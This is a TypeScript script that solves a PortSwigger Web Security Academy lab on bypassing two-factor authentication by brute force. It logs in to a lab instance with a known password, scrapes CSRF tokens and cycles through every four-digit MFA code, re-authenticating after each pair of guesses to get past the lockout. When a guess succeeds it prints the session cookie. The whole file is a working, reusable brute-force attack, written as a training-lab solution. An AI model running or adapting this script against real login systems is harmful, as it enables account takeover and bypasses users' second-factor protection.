// https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack

;(async () => {
	// #region classes
	class Sess {
		history = [] as Res[]
		constructor(private cookies = [] as string[]) {}

		req = async (request: string) => {
			const lines = request.trim().split("\n")
			if (!lines.length) throw new Error("Empty request string!")

			const [method, url] = lines.shift()!.trim().split(" ")

			let i = 0
			const headers = {} as Record<string, string>
			for (; i < lines.length; i++) {
				const line = lines[i]!.trim()
				if (!line) break

				const [key, ...values] = line.split(":")
				headers[key!] = values.join(":").trim()
			}

			if ("Cookie" in headers) {
				headers.Cookie = [...this.cookies, headers.Cookie].join("; ")
			} else if ("cookie" in headers) {
				headers.cookie = [...this.cookies, headers.cookie].join("; ")
			} else {
				headers.Cookie = this.cookies.join("; ")
			}

			let body = lines
				.slice(++i)
				.map(l => l.trim())
				.join("\n")
				.trim()

			const req = await fetch(url!, {
				method,
				headers,
				body: method!.toLowerCase() === "get" ? undefined : body,
			})

			const res = new Res(req, await req.text())

			this.history.push(res)
			this.cookies.push(...res.cookies())

			return res
		}
	}

	class Res {
		constructor(
			private res: Response,
			private text: string,
		) {}

		get raw() {
			return this.res
		}

		status() {
			return this.res.status
		}

		headers() {
			return this.res.headers
		}

		header(key: string): string | string[] | undefined {
			return [...this.res.headers.entries()].find(
				([k]) => k.toLowerCase() === key.toLowerCase(),
			)?.[1]
		}

		cookies(): string[] {
			return (this.header("set-cookie") as string[])?.map(c => c.split(";")[0]!) ?? []
		}

		body() {
			return this.text
		}

		bodreg(regexp: RegExp) {
			return this.text.match(regexp)?.slice(1)
		}
	}
	// #endregion

	console.clear()

	const iter = async (mfa1: number, mfa2: number) => {
		const sess = new Sess()
		const r1 = await sess.req(`
			GET https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net/login HTTP/1.1
			Upgrade-Insecure-Requests: 1
			Sec-Fetch-Dest: document
			Sec-Fetch-Mode: navigate
			Sec-Fetch-Site: same-origin
			Sec-Fetch-User: ?1
		`)

		const csrf1 = r1.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0]

		const r2 = await sess.req(`
			POST https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net/login HTTP/1.1
			Content-Type: application/x-www-form-urlencoded
			Content-Length: 70
			Origin: https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net
			Upgrade-Insecure-Requests: 1
			Sec-Fetch-Dest: document
			Sec-Fetch-Mode: navigate
			Sec-Fetch-Site: same-origin
			Sec-Fetch-User: ?1

			csrf=${csrf1}&username=carlos&password=montoya
		`)

		const csrf2 = r2.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0]

		const r3 = await sess.req(`
			POST https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net/login2 HTTP/1.1
			Content-Type: application/x-www-form-urlencoded
			Content-Length: 51
			Origin: https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net
			Upgrade-Insecure-Requests: 1
			Sec-Fetch-Dest: document
			Sec-Fetch-Mode: navigate
			Sec-Fetch-Site: same-origin
			Sec-Fetch-User: ?1
	
			csrf=${csrf2}&mfa-code=${(mfa1 + "").padStart(4, "0")}
		`)

		if (r3.status() === 302) {
			console.log("COOKIE ATTAINED:", r3.cookies())
			return true
		} else {
			console.log("MFA FAILED: ", mfa1)
		}

		const r4 = await sess.req(`
			POST https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net/login2 HTTP/1.1
			Content-Type: application/x-www-form-urlencoded
			Content-Length: 51
			Origin: https://0a6300ee03dd804b81a9ac5100f60088.web-security-academy.net
			Upgrade-Insecure-Requests: 1
			Sec-Fetch-Dest: document
			Sec-Fetch-Mode: navigate
			Sec-Fetch-Site: same-origin
			Sec-Fetch-User: ?1
	
			csrf=${csrf2}&mfa-code=${(mfa2 + "").padStart(4, "0")}
		`)

		if (r4.status() === 302) {
			console.log("COOKIE ATTAINED:", r4.cookies())
			return true
		} else {
			console.log("MFA FAILED: ", mfa2)
		}

		return false
	}

	for (let i = 0; i < 9999; i++) {
		if (await iter(i, ++i)) {
			break
		}
	}
})()
